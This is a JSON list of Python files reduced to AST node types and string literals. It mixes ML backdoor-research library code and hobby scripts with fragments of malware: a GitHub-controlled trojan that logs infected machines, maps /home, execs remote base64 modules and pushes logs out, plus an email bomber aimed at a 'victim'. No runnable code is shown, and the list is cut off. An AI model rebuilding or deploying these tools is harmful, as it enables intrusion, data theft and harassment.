[
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Pass",
            "Subscript",
            "Store",
            "Name",
            "FormattedValue",
            "ExceptHandler",
            "ClassDef",
            "Constant",
            "Tuple",
            "Import",
            "Compare",
            "IsNot",
            "List",
            "NotIn",
            "Try",
            "Expr",
            "JoinedStr",
            "Return",
            "Is",
            "keyword",
            "BitOr",
            "Assign",
            "alias",
            "Raise",
            "arguments",
            "Dict",
            "Attribute",
            "If",
            "BinOp",
            "ImportFrom",
            "arg"
        ],
        "Strings": [
            "Main attack method (need overriding).",
            "general_config",
            "abc",
            "add_argument",
            "_ArgumentGroup",
            "ArgumentParser",
            "name",
            "idx",
            "red",
            "update",
            "create",
            "isinstance",
            "-d",
            "class_dict",
            " not in \n",
            "--attack_dir",
            "list",
            "\n    | An abstract class representing an attack.\n    | It inherits :class:`trojanzoo.utils.module.ModelProcess`.\n\n    Note:\n        This is the implementation of attack.\n        For users, please use :func:`create` instead, which is more user-friendly.\n    ",
            "full_config",
            "same",
            "type",
            "--dataset",
            "Config",
            "Attack",
            "trojanzoo.utils.module",
            "Dataset",
            "Add attack arguments to argument parser group.\n        View source to see specific arguments.\n\n        Note:\n            This is the implementation of adding arguments.\n            The concrete attack class may override this method to add more arguments.\n            For users, please use :func:`add_argument()` instead, which is more user-friendly.\n        ",
            "ModelProcess",
            "model",
            "output level (default: 0)",
            "Generate target labels of a batched input based on\n        the classification confidence ranking index.\n\n        Args:\n            _input (torch.Tensor): The input tensor.\n            idx (int): The classification confidence\n                rank of target class.\n                Defaults to ``1``.\n            same (bool): Generate the same label\n                for all samples using mod.\n                Defaults to ``False``.\n\n        Returns:\n            torch.Tensor:\n                The generated target label with shape ``(N)``.\n\n        See Also:\n            This method calls\n            :meth:`trojanzoo.models.Model.generate_target()`.\n\n            The implementation is in\n            :func:`trojanzoo.utils.model.generate_target()`.\n        ",
            "Tensor",
            "result",
            "module",
            "default_dataset",
            "bool",
            "dataset_name",
            "dest",
            "group",
            "\n    | Add attack arguments to argument parser.\n    | For specific arguments implementation, see :meth:`Attack.add_argument()`.\n\n    Args:\n        parser (argparse.ArgumentParser): The parser to add arguments.\n        attack_name (str): The attack name.\n        attack (str | Attack): The attack instance or attack name\n            (as the alias of `attack_name`).\n        class_dict (dict[str, type[Attack]]):\n            Map from attack name to attack class.\n            Defaults to ``{}``.\n\n    Returns:\n        argparse._ArgumentGroup: The argument group.\n    ",
            "self",
            "directory to contain attack results",
            "dict",
            "print",
            "ansi",
            "ABC",
            "Model",
            "attack_name",
            "format",
            "torch",
            "dataset",
            "trojanzoo.configs",
            "cls",
            "str",
            "keys",
            "reset",
            "--model",
            "os",
            "trojanzoo.models",
            "argparse",
            "specific_config",
            "add_argument_group",
            "folder_path",
            "help",
            "get_name",
            "--output",
            "you need to first claim the attack name using \"--attack\".",
            "trojanzoo.datasets",
            "path",
            "attack_dir",
            "TYPE_CHECKING",
            "arg_list",
            "_input",
            "parser",
            "model_name",
            "typing",
            "trojanzoo.utils.output",
            "config",
            "attack",
            "int",
            "classmethod",
            "kwargs",
            "abstractmethod",
            "--attack",
            "generate_target",
            "{yellow}attack{reset}",
            "description",
            "KeyError",
            "\n    | Create an attack instance.\n    | For arguments not included in :attr:`kwargs`,\n      use the default values in :attr:`config`.\n    | The default value of :attr:`folder_path` is\n      ``'{attack_dir}/{dataset.data_type}/{dataset.name}/{model.name}/{attack.name}'``.\n    | For attack implementation, see :class:`Attack`.\n\n    Args:\n        attack_name (str): The attack name.\n        attack (str | Attack): The attack instance or attack name\n            (as the alias of `attack_name`).\n        dataset_name (str): The dataset name.\n        dataset (str | Dataset):\n            Dataset instance or dataset name\n            (as the alias of `dataset_name`).\n        model_name (str): The model name.\n        model (str | Model): The model instance or model name\n            (as the alias of `model_name`).\n        config (Config): The default parameter config.\n        class_dict (dict[str, type[Attack]]):\n            Map from attack name to attack class.\n            Defaults to ``{}``.\n        **kwargs: The keyword arguments\n            passed to attack init method.\n\n    Returns:\n        Attack: The attack instance.\n    ",
            "AttackType",
            "-m",
            "join",
            "data_type",
            "get_config"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "MatchClass",
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Match",
            "match_case",
            "Subscript",
            "Store",
            "Name",
            "FormattedValue",
            "GtE",
            "ExceptHandler",
            "ClassDef",
            "Constant",
            "Or",
            "Tuple",
            "Import",
            "Compare",
            "IsNot",
            "List",
            "Not",
            "NotIn",
            "AnnAssign",
            "Try",
            "Expr",
            "USub",
            "JoinedStr",
            "Return",
            "IfExp",
            "Is",
            "keyword",
            "UnaryOp",
            "BitOr",
            "Starred",
            "MatchAs",
            "Assign",
            "MatchValue",
            "And",
            "alias",
            "Raise",
            "arguments",
            "Attribute",
            "Dict",
            "If",
            "BinOp",
            "BoolOp",
            "ImportFrom",
            "Assert",
            "Mult",
            "arg",
            "Eq"
        ],
        "Strings": [
            "Split a dataset into two subsets.\n\n        Args:\n            dataset (torch.utils.data.Dataset): The dataset to split.\n            length (int): The length of the first subset.\n                This argument cannot be used together with :attr:`percent`.\n                If ``None``, use :attr:`percent` to calculate length instead.\n                Defaults to ``None``.\n            percent (float): The split ratio for the first subset.\n                This argument cannot be used together with :attr:`length`.\n                ``length = percent * len(dataset)``.\n                Defaults to ``None``.\n            shuffle (bool): Whether to shuffle the dataset.\n                Defaults to ``True``.\n            seed (bool): The random seed to split dataset\n                using :any:`numpy.random.shuffle`.\n                Defaults to ``env['data_seed']``.\n\n        Returns:\n            (torch.utils.data.Subset, torch.utils.data.Subset):\n                The two splitted subsets.\n\n        :Example:\n            >>> from trojanzoo.utils.data import TensorListDataset\n            >>> from trojanzoo.datasets import Dataset\n            >>> import torch\n            >>>\n            >>> data = torch.ones(11, 3, 32, 32)\n            >>> targets = list(range(11))\n            >>> dataset = TensorListDataset(data, targets)\n            >>> set1, set2 = Dataset.split_dataset(dataset, length=3)\n            >>> len(set1), len(set2)\n            (3, 8)\n            >>> set3, set4 = split_dataset(dataset, percent=0.5)\n            >>> len(set3), len(set4)\n            (5, 6)\n\n        See Also:\n            The implementation is in\n            :func:`trojanzoo.utils.data.split_dataset`.\n            The difference is that this method will set :attr:`seed`\n            as ``env['data_seed']`` when it is ``None``.\n        ",
            "utils",
            "transform",
            "abc",
            "add_argument",
            "batch_size",
            "_get_org_dataset",
            "_ArgumentGroup",
            "ArgumentParser",
            "name",
            "update",
            "Get original dataset that is not splitted.\n\n        Note:\n            This is a wrapper and the specific implementation\n            is in :meth:`_get_org_dataset`, which needs overriding.\n\n        Args:\n            mode (str): Dataset mode (e.g., ``'train'`` or ``'valid'``).\n            transform (~collections.abc.Callable):\n                The transform applied on dataset.\n                Defaults to :meth:`get_transform()`.\n            **kwargs: Keyword arguments passed to :meth:`_get_org_dataset`.\n\n        Returns:\n            torch.utils.data.Dataset: The original dataset.\n\n        See Also:\n            :meth:`get_dataset`\n        ",
            "device",
            "create",
            "-d",
            "class_dict",
            " not in \n",
            "list",
            "action",
            "full_config",
            "get_org_dataset",
            "staticmethod",
            "Initialize the dataset (download and extract) if it's not prepared yet\n        (need overriding).\n        ",
            "check_files",
            "type",
            "normpath",
            "get_dataloader",
            "Iterable",
            "--dataset",
            "--num_workers",
            "DatasetType",
            "data_dir",
            "split_ratio",
            "Config",
            "super",
            "--valid_batch_size",
            "dataset name (lowercase)",
            "RuntimeError",
            "trojanzoo.utils.module",
            "Subset",
            "Dataset",
            "Check if the dataset files are prepared.\n\n        Args:\n            **kwargs: Keyword arguments passed to :meth:`get_org_dataset`.\n\n        Returns:\n            bool: Whether the dataset files are prepared.\n        ",
            "makedirs",
            "targets",
            "float",
            "ndarray",
            "load",
            "data_seed",
            "zip",
            "--data_dir",
            "\n    | Add dataset arguments to argument parser.\n    | For specific arguments implementation, see :meth:`Dataset.add_argument()`.\n\n    Args:\n        parser (argparse.ArgumentParser): The parser to add arguments.\n        dataset_name (str): The dataset name.\n        dataset (str | Dataset): Dataset instance or dataset name\n            (as the alias of `dataset_name`).\n        config (Config): The default parameter config,\n            which contains the default dataset name if not provided.\n        class_dict (dict[str, type[Dataset]]):\n            Map from dataset name to dataset class.\n            Defaults to ``{}``.\n    ",
            "Process data. Defaults to directly return :attr:`data`.\n\n        Args:\n            data (Any): Unprocessed data.\n            **kwargs: Keyword arguments to process data.\n\n        Returns:\n            Any: Processed data.\n        ",
            "cached_property",
            "Tensor",
            "result",
            "get_transform",
            "\n    | Create a dataset instance.\n    | For arguments not included in :attr:`kwargs`,\n      use the default values in :attr:`config`.\n    | The default value of :attr:`folder_path` is\n      ``'{data_dir}/{data_type}/{name}'``.\n    | For dataset implementation, see :class:`Dataset`.\n\n    Args:\n        dataset_name (str): The dataset name.\n        dataset (str): The alias of `dataset_name`.\n        config (Config): The default parameter config.\n        class_dict (dict[str, type[Dataset]]):\n            Map from dataset name to dataset class.\n            Defaults to ``{}``.\n        **kwargs: Keyword arguments\n            passed to dataset init method.\n\n    Returns:\n        Dataset: Dataset instance.\n    ",
            "--download",
            "module",
            "default_dataset",
            "Dataset Folder Path: ",
            "BasicObject",
            "np",
            "collate_fn",
            "NotImplementedError",
            "bool",
            "dataset_name",
            "Get dataset transform for mode.\n\n        Args:\n            mode (str): Dataset mode (e.g., ``'train'`` or ``'valid'``).\n\n        Returns:\n            ~collections.abc.Callable: A callable transform.\n        ",
            "dest",
            "group",
            "self",
            "batch size (negative number means batch_size for each gpu)",
            "dict",
            "loss_weights",
            "label_names",
            "print",
            "ansi",
            "get_dataset",
            "ABC",
            "__batch_size",
            "functools",
            "len",
            "format",
            "astype",
            "Loss Weights Saved at ",
            "torch",
            "subset",
            "valid_set",
            "split_dataset",
            "train",
            "Get a subset from dataset with certain classes.\n\n        Args:\n            dataset (torch.utils.data.Dataset): The entire dataset.\n            class_list (int | list[int]): The class list to pick.\n\n        Returns:\n            torch.utils.data.Subset:\n                The subset with labels in :attr:`class_list`.\n\n        :Example:\n            >>> from trojanzoo.utils.data import TensorListDataset\n            >>> from trojanzoo.utils.data import get_class_subset\n            >>> import torch\n            >>>\n            >>> data = torch.ones(11, 3, 32, 32)\n            >>> targets = list(range(11))\n            >>> dataset = TensorListDataset(data, targets)\n            >>> subset = get_class_subset(dataset, class_list=[2, 3])\n            >>> len(subset)\n            2\n\n        See Also:\n            The implementation is in\n            :func:`trojanzoo.utils.data.get_class_subset`.\n        ",
            "get_loss_weights",
            "args",
            "dataset",
            "verbose",
            "collections.abc",
            "\n    | An abstract class representing a dataset.\n    | It inherits :class:`trojanzoo.utils.module.BasicObject`.\n\n    Note:\n        This is the implementation of dataset.\n        For users, please use :func:`create` instead, which is more user-friendly.\n\n    Args:\n        batch_size (int): Batch size of training set\n            (negative number means batch size for each gpu).\n            Defaults to ``100``.\n        valid_batch_size (int): Batch size of validation set.\n            Defaults to ``100``.\n        folder_path (str): Folder path to store dataset.\n            Defaults to ``None``.\n\n            Note:\n                :attr:`folder_path` is usually\n                ``'{data_dir}/{data_type}/{name}'``,\n                which is claimed as the default value of :func:`create()`.\n        download (bool): Download dataset if not exist. Defaults to ``False``.\n        split_ratio (float):\n            | Split training set for training and validation\n              if :attr:`valid_set` is ``False``.\n            | The ratio stands for\n              :math:`\\frac{\\text{\\# training\\ subset}}{\\text{\\# total\\ training\\ set}}`.\n            | Defaults to ``0.8``.\n        num_workers (int): Used in :meth:`get_dataloader()`.\n            Defaults to ``4``.\n        loss_weights (bool | np.ndarray | torch.Tensor):\n            | The loss weights w.r.t. each class.\n            | if :any:`numpy.ndarray` or :any:`torch.Tensor`,\n              directly set as :attr:`loss_weights` (cpu tensor).\n            | if ``True``, set :attr:`loss_weights` as :meth:`get_loss_weights()`;\n            | if ``False``, set :attr:`loss_weights` as ``None``.\n        **kwargs: Any keyword argument (unused).\n\n    Attributes:\n        name (str): Dataset Name. (need overriding)\n        loader(dict[str, ~torch.utils.data.DataLoader]):\n            | Preset dataloader for users at dataset initialization.\n            | It contains ``'train'`` and ``'valid'`` loaders.\n        batch_size (int): Batch size of training set (always positive).\n            Defaults to ``100``.\n        valid_batch_size (int): Batch size of validation set.\n            Defaults to ``100``.\n        num_classes (int): Number of classes. (need overriding)\n        folder_path (str): Folder path to store dataset.\n            Defaults to ``None``.\n\n        data_type (str): Data type (e.g., ``'image'``). (need overriding)\n        label_names (list[int]): Number of classes. (optional)\n        valid_set (bool): Whether having a native validation set.\n            Defaults to ``True``.\n        split_ratio (float):\n            | Split training set for training and validation\n              if :attr:`valid_set` is ``False``.\n            | The ratio stands for\n              :math:`\\frac{\\text{\\# training\\ subset}}{\\text{\\# total\\ training\\ set}}`.\n            | Defaults to ``0.8``.\n        loss_weights (torch.Tensor | None): The loss weights w.r.t. each class.\n        num_workers (int): Used in :meth:`get_dataloader()`.\n            Defaults to ``4``.\n        collate_fn (~collections.abc.Callable | None):\n            Used in :meth:`get_dataloader()`.\n            Defaults to ``None``.\n    ",
            "directory to contain datasets",
            "percent",
            "trojanzoo.configs",
            "loader",
            "bincount",
            "cls",
            "download dataset if not exist by calling self.initialize()",
            "str",
            "num_gpus",
            "keys",
            "Add dataset arguments to argument parser group.\n        View source to see specific arguments.\n\n        Note:\n            This is the implementation of adding arguments.\n            The concrete dataset class may override this method to add more arguments.\n            For users, please use :func:`add_argument()` instead, which is more user-friendly.\n        ",
            "mode",
            "download",
            "shuffle",
            "--batch_size",
            "__valid_batch_size",
            "os",
            "torch.utils.data",
            "save",
            "TypeError",
            "argparse",
            "add_argument_group",
            "trojanzoo.environ",
            "folder_path",
            "help",
            "_get_loader_dict",
            "Callable",
            "{yellow}dataset{reset}",
            "class_list",
            "Get dataloader. Call :meth:`get_dataset` if :attr:`dataset` is not provided.\n\n        Args:\n            mode (str): Dataset mode (e.g., ``'train'`` or ``'valid'``).\n            dataset (torch.utils.data.Dataset): The pytorch dataset.\n            batch_size (int):\n                Defaults to :attr:`self.batch_size` for ``'train'`` mode\n                and :attr:`self.valid_batch_size` for ``'valid'`` mode.\n            shuffle (bool): Whether to shuffle.\n                Defaults to ``True`` for ``'train'`` mode\n                and ``False`` for ``'valid'`` mode.\n            num_workers (int): Number of workers for dataloader.\n                Defaults to :attr:`self.num_workers`.\n            pin_memory (bool): Whether to use pin memory.\n                Defaults to ``True`` if there is any GPU available.\n            drop_last (bool): Whether drop the last batch if not full size.\n                Defaults to ``False``.\n            collate_fn (~collections.abc.Callable):\n                Passed to :any:`torch.utils.data.DataLoader`.\n            **kwargs: Keyword arguments passed to :meth:`get_dataset`\n                if :attr:`dataset` is not provided.\n\n        Returns:\n            torch.utils.data.DataLoader: The pytorch dataloader.\n        ",
            "num_workers passed to torch.utils.data.DataLoader (default: 4)",
            "reciprocal",
            "get_name",
            "env",
            "pin_memory",
            "length",
            "num_classes",
            "valid_batch_size",
            "DataLoader",
            "path",
            "exists",
            "Calculate :attr:`loss_weights` as reciprocal of data size of each class\n        (to mitigate data imbalance).\n\n        Args:\n            file_path (str):\n                | The file path of saved weights file.\n                | If exist, just load the file and return;\n                | else, calculate the weights, save and return.\n                | Defaults to ``{folder_path}/loss_weights.npy``\n            verbose (bool): Whether to print verbose information.\n                Defaults to ``True``.\n\n        Returns:\n            torch.Tensor: The tensor of loss weights w.r.t. each class.\n        ",
            "param_list",
            "from_numpy",
            "loss_weights.npy",
            "valid batch size",
            "append",
            "store_true",
            "TYPE_CHECKING",
            "arg_list",
            "numpy",
            "data",
            "array",
            "max",
            "parser",
            "valid",
            "trojanzoo.utils.data",
            "__init__",
            "drop_last",
            "typing",
            "trojanzoo.utils.output",
            "config",
            "get_class_subset",
            "Calculating Loss Weights",
            "self.folder_path=",
            "Get dataset. Call :meth:`split_dataset` to split the training set\n        if :attr:`valid_set` is ``False``.\n\n        Args:\n            mode (str): Dataset mode (e.g., ``'train'`` or ``'valid'``).\n            seed (int): The random seed to split dataset\n                using :any:`numpy.random.shuffle`.\n                Defaults to ``env['data_seed']``.\n            class_list (int | list[int]):\n                The class list to pick. Defaults to ``None``.\n            **kwargs: Keyword arguments passed to :meth:`get_org_dataset`.\n\n        Returns:\n            torch.utils.data.Dataset: The original dataset.\n        ",
            "dtype",
            "Exception",
            "int",
            "file_path",
            "classmethod",
            "kwargs",
            "abstractmethod",
            "num_workers",
            "seed",
            "description",
            "KeyError",
            "initialize",
            "get_data",
            "to",
            "join",
            "data_type",
            "get_config"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Store",
            "FormattedValue",
            "Name",
            "ClassDef",
            "Constant",
            "Import",
            "Expr",
            "JoinedStr",
            "Assign",
            "alias",
            "arguments",
            "withitem",
            "Attribute",
            "arg",
            "With"
        ],
        "Strings": [
            "log",
            "Log in een bestand wanneer de hacker een nieuwe pc heeft ",
            "file",
            "a",
            "datetime",
            "logs/",
            "log_file",
            "/log_",
            "%Y-%m-%d_%H-%M-%S",
            "Default_module",
            " besmet\n",
            "Hallo ik ben op ",
            "self",
            "write",
            "now",
            "timestamp",
            "print",
            "strftime",
            "open",
            ".txt",
            "id"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Assign",
            "alias",
            "Module",
            "FunctionDef",
            "Call",
            "Constant",
            "arguments",
            "Load",
            "Attribute",
            "Expr",
            "Import",
            "Return",
            "Store",
            "arg",
            "Name"
        ],
        "Strings": [
            "files",
            ".",
            "os",
            "args",
            "listdir",
            "print",
            "run",
            "In dirlister module.",
            "str"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Pow",
            "Div",
            "NotEq",
            "Subscript",
            "For",
            "Store",
            "Name",
            "ClassDef",
            "Constant",
            "While",
            "Continue",
            "Lambda",
            "Tuple",
            "Import",
            "Compare",
            "List",
            "Not",
            "NotIn",
            "Mod",
            "Slice",
            "Expr",
            "USub",
            "Return",
            "keyword",
            "UnaryOp",
            "AugAssign",
            "Eq",
            "Assign",
            "Add",
            "alias",
            "arguments",
            "withitem",
            "Attribute",
            "Dict",
            "Sub",
            "If",
            "BinOp",
            "Mult",
            "ImportFrom",
            "arg",
            "With"
        ],
        "Strings": [
            "transform",
            "file",
            "NONE",
            "retValRef",
            "delay",
            "update",
            "sys",
            "MESH",
            "nodeNumber",
            "startPosition",
            "quit",
            "x1",
            "fullconnect.txt",
            "computerLocations",
            "draw",
            "type",
            "STAR",
            "MESH_GRAPH",
            "pointB",
            "drawGraphFromFile",
            "node",
            "#",
            "getComputerLocationsOnDisplay",
            "graphType",
            "hasCompletedALine",
            "dataToDisplay",
            "mesh.txt",
            "fill",
            "buildTreeComputerLocations",
            "load",
            "x3",
            "screen",
            "HYBRID",
            "RING_GRAPH",
            "edges",
            "cos",
            "amax",
            "display",
            "fileName",
            "sort",
            "pygame",
            "size",
            "numberPairs",
            "1",
            "N",
            "toDraw",
            "animationSteps",
            "\n",
            "lines",
            "star.txt",
            "time",
            "tuple",
            "y1",
            "count",
            "self",
            "len",
            "print",
            "Enum",
            "retVal",
            "astype",
            "startAnimation",
            "display_width",
            "STAR_GRAPH",
            "repositionedValues",
            "positionsInImage",
            "set_mode",
            "split",
            "RING",
            "typeOfGraph",
            "pi",
            "TREE",
            "depth",
            "exit",
            "line.txt",
            "round",
            "ALL_CONNECTED_GRAPH",
            "tree.txt",
            "centerOfFieldX",
            "defaultLines",
            "r",
            "y2",
            "compImage.png",
            "event",
            "currentNode",
            "ring.txt",
            "line",
            "stepsDone",
            "LINE_GRAPH",
            "computerImage",
            "edgesToExplore",
            "computerPositions",
            "nodes",
            "LINE",
            "blit",
            "image",
            "ALL_CONNECTED",
            "enum",
            "tick",
            "range",
            "TREE_GRAPH",
            "key",
            "numberOfNodes",
            "done",
            "append",
            "newNodeNumber",
            "sin",
            "walkTree",
            "x2",
            "x",
            "numpy",
            "edgesDone",
            "data",
            "QUIT",
            "array",
            "totalDistance",
            "find",
            "tree",
            "BUS",
            "location",
            "scale",
            "init",
            "__init__",
            "\t",
            "iterationDone",
            "roundTuple",
            "pointA",
            "linesToDraw",
            "yVal",
            "int",
            "y3",
            "distanceBetweenTwoPoints",
            "centerOfFieldY",
            "nodeToLocations",
            "clock",
            "Clock",
            "get",
            "display_height",
            "treeNodes",
            "edge",
            "open",
            "treeNode"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "alias",
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "arguments",
            "Constant",
            "Attribute",
            "Expr",
            "Import",
            "Return",
            "arg",
            "Name"
        ],
        "Strings": [
            "environ",
            "In environment module.",
            "os",
            "args",
            "print",
            "run"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Gt",
            "Subscript",
            "For",
            "Store",
            "Name",
            "Constant",
            "While",
            "Tuple",
            "Import",
            "Compare",
            "Lt",
            "Expr",
            "keyword",
            "AugAssign",
            "Assign",
            "Add",
            "LtE",
            "alias",
            "Raise",
            "arguments",
            "Attribute",
            "If",
            "BinOp",
            "Mult",
            "arg",
            "Eq"
        ],
        "Strings": [
            "\nCameron Padua\nGroup Project\nfileMaker\n\nThis script will create different network shapes files. Currently it supports\nstar, mesh, fully connected, line, and tree. If you would like to create an \nindividual file, you call the method responsible for creating it. By default, \neach method will create a network with 10 nodes that are bidirectional. If you\npass in an integer value to the method, you can vary the size of the number of\nnodes. Additionally, you can call the main method to create every type of network\nfile. By default, they will all have 10 nodes, but if you pass a integer value,\nyou can vary the size.\n\nNote: Code written for Python 3.6\n\n\nNotes to Use:\n    import fileMaker\n    call individual methods\n        Example\n        fileMaker.star(n)\n\n\n    IGNORE, ONLY USE IF YOU UN-COMMENT EVAL LINE AT THE BOTTOM\n    if you are in a linux enviroment, make sure to chmod +x the file\n    run the script by using ./fileMaker 'method()'\n    for example ./fileMaker 'main(14)' or ./fileMaker 'star(14)'\n    \n    if you are using Windows, you will need to do something like (I think)\n    pyhton fileMaker.py 'method(10)'\n",
            "ring",
            "x",
            "w",
            "numpy",
            "zeros",
            "line.txt",
            "val1",
            "str",
            "tree",
            "fileName",
            "Cannot create shape with 1 node",
            "sys",
            "Tree File made. File is named ",
            "tree.txt",
            "star",
            "\n    Writes a pair of integers to a file.\n    \n    Input: File: a file object to write to. \n           val1: an integer to write to the file\n           va12: an integer to write to the file\n    Return: Nothing\n    \n    ",
            "currentMaxNode",
            "\n",
            "np",
            "mesh",
            "val2",
            "Fully connected File made. File is named ",
            "\t",
            "bool",
            "maxNumber",
            "writePairs",
            "maxNode",
            "star.txt",
            "dtype",
            "Exception",
            "currentNode",
            "fullconnect.txt",
            "ring.txt",
            "write",
            "line",
            "File",
            "Line File made. File is named ",
            "print",
            "close",
            "random",
            "fullConnected",
            "Star File made. File is named ",
            "Ring File made. File is named ",
            "main",
            "open",
            "record",
            "range",
            "y",
            "mesh.txt"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Pass",
            "For",
            "Store",
            "Name",
            "FormattedValue",
            "ExceptHandler",
            "ClassDef",
            "Constant",
            "Import",
            "Try",
            "Expr",
            "JoinedStr",
            "Assign",
            "Add",
            "alias",
            "arguments",
            "withitem",
            "Attribute",
            "If",
            "BinOp",
            "Mult",
            "arg",
            "With"
        ],
        "Strings": [
            "]\n",
            "item_path",
            "log",
            "file",
            "basename",
            "home_directory",
            "directory",
            "/log_folders.txt",
            "a",
            "logs/",
            "log_file",
            "/home",
            "item",
            "FolderMapper_module",
            "os",
            "\n",
            "[",
            "join",
            "self",
            "write",
            "listdir",
            "Functie die map /home gaat loggen helemaal  ",
            "indent",
            "  ",
            "    ",
            "Mappen en bestanden in /home:\n\n",
            "isdir",
            "subdirectories",
            "_map_files_recursive",
            "PermissionError",
            "path",
            "open",
            "id",
            "indent_level"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Gt",
            "Store",
            "Name",
            "FormattedValue",
            "GtE",
            "ExceptHandler",
            "Constant",
            "While",
            "Or",
            "Break",
            "Import",
            "Compare",
            "List",
            "Not",
            "Try",
            "Expr",
            "JoinedStr",
            "Return",
            "UnaryOp",
            "AugAssign",
            "Assign",
            "Add",
            "LtE",
            "alias",
            "arguments",
            "Attribute",
            "Sub",
            "If",
            "BinOp",
            "Assert",
            "BoolOp",
            "Mult",
            "arg",
            "Eq"
        ],
        "Strings": [
            "done",
            "welcome_message",
            "append",
            "Enter a guess between 0 and 100",
            "difficulty",
            "/",
            "Welcome to \"Guess a Number!\"",
            "Please choose typing 1, 2 or 3.",
            "previous_numbers",
            " > ",
            "hint: the actual number is smaller",
            "input",
            "max_tries",
            "hint: the actual number is larger",
            "number",
            "tries",
            "You lost!",
            "int",
            "print",
            " tries!",
            "\nChoose difficulty:",
            "random",
            "guess",
            "Your choice: ",
            "[3] Legend",
            "[1] Medium",
            "[2] Hard",
            "choice",
            "choose_difficulty",
            "randint",
            "You won!",
            ": ",
            "game",
            "get_max_tries",
            "[0] Easy",
            "You got it after "
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Store",
            "Name",
            "FormattedValue",
            "ExceptHandler",
            "ClassDef",
            "Constant",
            "Tuple",
            "Import",
            "Try",
            "Expr",
            "JoinedStr",
            "Return",
            "keyword",
            "Assign",
            "alias",
            "arguments",
            "withitem",
            "Attribute",
            "If",
            "arg",
            "With"
        ],
        "Strings": [
            "check_remote_repo",
            "rmtree",
            "read",
            "local_directory",
            "shutil",
            "Deze funcite zal de repo controleren of er een config file beschickbaar is zoja return yes ",
            "Modules inladen van github ",
            "file",
            "remove",
            "name",
            "repo",
            "current_config_file",
            "remote",
            "origin",
            "str",
            "e",
            "push",
            "__init__",
            "config.txt",
            "git",
            "os",
            "copy2",
            "response",
            "config",
            "send_logs_to_github",
            "exc",
            "An error occurred: ",
            "r",
            "join",
            "Nieuwe config halen van github en de oude verwijderen",
            "temp_dir",
            "modules",
            "logs_directory",
            "Github",
            "load_modules",
            "Exception",
            "temp_directory",
            "config_file_path",
            "self",
            "GitCommandError",
            "print",
            "get_config",
            "current_config_dir",
            "close",
            "commit",
            "FileNotFoundError",
            "copytree",
            "temp_config_file",
            "all",
            "repo_url",
            "add",
            "logs",
            "Add new log entries",
            "index",
            "path",
            "exists",
            "Repo",
            "open",
            "config_dir",
            "clone_from",
            "id",
            "Deze functie zal de inhoud van de map logs kopieren naar temp_dir en vervolgens de log files gaan versturen naar github "
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "Call",
            "Load",
            "For",
            "Store",
            "Name",
            "ExceptHandler",
            "Constant",
            "Import",
            "Not",
            "Try",
            "Expr",
            "UnaryOp",
            "Assign",
            "And",
            "alias",
            "Attribute",
            "If",
            "BoolOp"
        ],
        "Strings": [
            "Successfully Signed in",
            "Please Enter Your Victim Email : ",
            "please enter your password ",
            "Count : ",
            "sys",
            "smtp.gmail.com",
            "system",
            "Amount of bombarding messages?",
            "hello123@gmail.com",
            "os",
            "send",
            "email",
            "Enter Your Message :\n",
            "input",
            "password",
            "mailnumber",
            "smtplib",
            "quit",
            "hide_cmd",
            "SMTP",
            "count",
            "int",
            "User not logged in",
            "print",
            "sendmail",
            "server",
            "messagetovic",
            "starttls",
            "pip install smtplib",
            "range",
            "Enter Your Email : ",
            "login"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Subscript",
            "For",
            "Store",
            "Name",
            "FormattedValue",
            "ClassDef",
            "Constant",
            "While",
            "Tuple",
            "Import",
            "Compare",
            "IsNot",
            "NotIn",
            "Mod",
            "Expr",
            "JoinedStr",
            "Return",
            "keyword",
            "Eq",
            "Assign",
            "alias",
            "arguments",
            "withitem",
            "Attribute",
            "If",
            "BinOp",
            "Mult",
            "ImportFrom",
            "arg",
            "With"
        ],
        "Strings": [
            "",
            "module_from_spec",
            "name",
            "bytes",
            ".data",
            "sys",
            "dirname",
            "/",
            "%r",
            "threading",
            "f",
            "input",
            "spec",
            "sess",
            "data_path",
            ".py",
            "current_module_code",
            "github_connect",
            "module_name",
            "utf-8",
            "read",
            "username",
            "new_module",
            "strip",
            "origin",
            "config_file",
            "result",
            "load_module",
            "module",
            "\n",
            "bindata",
            "__dict__",
            "importlib",
            "time",
            "base64",
            ".json",
            "task",
            "self",
            "run",
            "print",
            "get_config",
            "args",
            "__name__",
            "import %s",
            "repository",
            "target",
            "id",
            "file_contents",
            "Attempting to retrieve %s",
            "store_module_result",
            "loader",
            "repo",
            "__main__",
            "data/",
            "start",
            "Trojan",
            "modules",
            "find_module",
            "token",
            "config_json",
            "b64decode",
            "exec",
            "horsey",
            "random",
            "b64encode",
            "GitImporter",
            "git_url",
            "Thread",
            "randint",
            "path",
            "meta_path",
            "Enter your Github username: ",
            "message",
            "append",
            "isoformat",
            "user",
            "data",
            "datetime",
            "spec_from_loader",
            "sleep",
            "thread",
            "content",
            "weathertoday.txt",
            "__init__",
            "remote_path",
            "config",
            "loads",
            "now",
            " Grabs files from the remote repository and reads the contents in locally.\n        This allows us to read configuration options and the module source code",
            "Enter your Github repository: ",
            "Github-aware trojan",
            "module_runner",
            "json",
            "create_file",
            "github3",
            "open",
            "util",
            " Every time the interpreter needs to load a module but is not available, it will use this class",
            "get_file_contents",
            "test",
            "login",
            "new_library"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "NotEq",
            "Store",
            "Name",
            "FormattedValue",
